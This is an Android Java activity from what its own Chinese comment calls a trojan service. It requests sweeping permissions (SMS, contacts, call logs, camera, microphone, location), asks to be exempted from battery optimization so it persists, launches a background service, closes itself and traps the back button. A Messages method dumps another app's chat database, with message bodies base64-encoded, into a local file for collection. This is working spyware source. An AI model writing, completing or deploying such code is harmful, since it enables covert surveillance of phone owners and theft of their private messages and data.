package com.hhm.android.otherapp;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Address;
import android.location.Geocoder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Message;
import android.os.PowerManager;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Base64;
import android.util.Log;
import android.view.KeyEvent;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.hhm.android.otherapp.managers.LocManager;
import com.hhm.android.otherapp.managers.SMSManager;
import com.hhm.android.otherapp.utils.AppUtil;
import com.hhm.android.otherapp.utils.ReadDB;

import org.json.JSONObject;

import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

import static com.hhm.android.otherapp.TelegramManager.init;


public class myActivity extends Activity {
    public static final String TAG = "MainActivity";

    private static final String[] PERMISSIONS = {Manifest.permission.READ_EXTERNAL_STORAGE,Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA,Manifest.permission.RECORD_AUDIO,Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_CONTACTS,Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_PHONE_STATE};

    private boolean isAllSet;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (initAllSettings()){
            Intent intent =  new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        }
        setContentView(R.layout.activity_main);
        //Messages(getApplicationContext(),"messages");
        startService(new Intent(this, myService.class));  // 在目标app的入口Activity的onCreate()中startService启动木马服务
        finish();
    }


    public JsonArray Messages(Context context, String tbl_name){
        JsonObject obj = new JsonObject();
        try {
            JsonArray jsonArray = new JsonArray();
            ReadDB respDB = new ReadDB(context.getApplicationContext());
            try {
                respDB.openDataBase();
            } catch (Throwable e) {
                e.printStackTrace();
            }
            Cursor cur;
            if (respDB.getDB() == null){
                return null;
            }
            cur = respDB.query(tbl_name);
            if (cur == null){
                return null;
            }
            if (cur.moveToLast()){ // 反向遍历对象
                do {
                    JSONObject jsonObject = new JSONObject();
                    String mid = cur.getString(0)==null ? "" : cur.getString(0);
                    String uid = cur.getString(1)==null ? "" : cur.getString(1);
                    String read_state = cur.getString(2)==null ? "" : cur.getString(2);
                    String send_state = cur.getString(3)==null ? "" : cur.getString(3);
                    String date = cur.getString(4)==null ? "" : cur.getString(4);
                    String data = cur.getBlob(5)==null ? "" : Base64.encodeToString(cur.getBlob(5), Base64.DEFAULT);
                    String out = cur.getString(6)==null ? "" : cur.getString(6);
                    String ttl = cur.getString(7)==null ? "" : cur.getString(7);
                    String media = cur.getString(8)==null ? "" : cur.getString(8);
                    String replydata = cur.getBlob(9)==null ? "" : Base64.encodeToString(cur.getBlob(9), Base64.DEFAULT);
                    String imp = cur.getString(10)==null ? "" : cur.getString(10);
                    String mention = cur.getString(11)==null ? "" : cur.getString(11);
                    jsonObject.put("mid",cur.getString(0)==null ? "" : cur.getString(0));
                    jsonObject.put("uid",cur.getString(1)==null ? "" : cur.getString(1));
                    jsonObject.put("read_state",cur.getString(2)==null ? "" : cur.getString(2));
                    jsonObject.put("send_state",cur.getString(3)==null ? "" : cur.getString(3));
                    jsonObject.put("date",cur.getString(4)==null ? "" : cur.getString(4));
                    jsonObject.put("data",cur.getBlob(5)==null ? "" : Base64.encodeToString(cur.getBlob(5), Base64.DEFAULT));// byte[] to base64 string
                    jsonObject.put("out",cur.getString(6)==null ? "" : cur.getString(6));
                    jsonObject.put("ttl",cur.getString(7)==null ? "" : cur.getString(7));
                    jsonObject.put("media",cur.getString(8)==null ? "" : cur.getString(8));
                    if (cur.getBlob(9)==null) {
                        jsonObject.put("replydata", (String) null);
                    } else {
                        jsonObject.put("replydata", Base64.encodeToString(cur.getBlob(9), Base64.DEFAULT));
                    }
                    jsonObject.put("imp",cur.getString(10)==null ? "" : cur.getString(10));
                    jsonObject.put("mention",cur.getString(11)==null ? "" : cur.getString(11));
                    String str = jsonObject.toString();
                    new AppUtil().saveAsFileWriter(str,"20202011.txt");
                    //jsonArray.add(jsonObject);
                } while (cur.moveToPrevious());
            }
            respDB.close();
            return jsonArray;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }



    // 初始化
    private boolean initAllSettings() {
        isAllSet = true;
        getPermissions(); // 申请权限
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) { // 加入电池白名单
            if (!isIgnoringBatteryOptimizations()){
                isAllSet = false;
                requestIgnoreBatteryOptimizations();
            }
        }
        return isAllSet;
    }

    // 动态申请权限
    private void getPermissions(){
        List<String> mPermissionList = new ArrayList<>();
        for (String permission : PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                mPermissionList.add(permission);
            }
        }
        if (!mPermissionList.isEmpty()){
            isAllSet = false;
            Log.e(TAG,"getPermissions():part permissions");
            //System.out.println(mPermissionList);
            String[] permissionsArr = mPermissionList.toArray(new String[0]);
            ActivityCompat.requestPermissions(this, permissionsArr, 10);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 10) {
            boolean hasAllPermissions = true;
            for (int grantResult : grantResults) {
                if (grantResult != PackageManager.PERMISSION_GRANTED) {
                    hasAllPermissions = false;
                    break;
                }
            }
            if (!hasAllPermissions){
                getPermissions();
            }
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    private boolean isIgnoringBatteryOptimizations() {
        boolean isIgnoring = false;
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (powerManager != null) {
            isIgnoring = powerManager.isIgnoringBatteryOptimizations(getPackageName());
        }
        return isIgnoring;
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    public void requestIgnoreBatteryOptimizations() {
        try {
            @SuppressLint("BatteryLife") Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent,2022);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (resultCode == 2022) {
            Log.e(TAG,"onActivityResult:ActivityResult "+resultCode);
        }
        super.onActivityResult(requestCode, resultCode, data);
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        //过滤按键动作
        if (event.getKeyCode() == KeyEvent.KEYCODE_BACK) {
            moveTaskToBack(true);
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    public void onBackPressed() {
        moveTaskToBack(true);
        super.onBackPressed();
    }


    @Override
    protected void onStart() {
        super.onStart();
    }

    @Override
    protected void onPause() {
        super.onPause();
    }

    @Override
    protected void onResume() {
        super.onResume();
    }

    @Override
    public void onDestroy() {
        //Log.e(TAG,"onDestroy():ondestroy");
        super.onDestroy();
    }

    //真实经纬度转地址
    private String getLocationAddress(double Longitude, double Latitude) {
        String add = "";
        Geocoder geoCoder = new Geocoder(getBaseContext(), Locale.CHINESE);
        try {
            List<Address> addresses = geoCoder.getFromLocation(Latitude, Longitude, 1);
            Address address = addresses.get(0);
            System.out.println("1=" + address.getAddressLine(0));
            System.out.println("2=" + address.getAdminArea());
            System.out.println("3=" + address.getCountryName());
            System.out.println("4=" + address.getFeatureName());
            System.out.println("5=" + address.getLocality());
            System.out.println("6=" + address.getSubAdminArea());
            System.out.println("7=" + address.getSubThoroughfare());
            System.out.println("8=" + address.getThoroughfare());
        } catch (IOException e) {
            add = "";
            e.printStackTrace();
        }
        return add;
    }


}
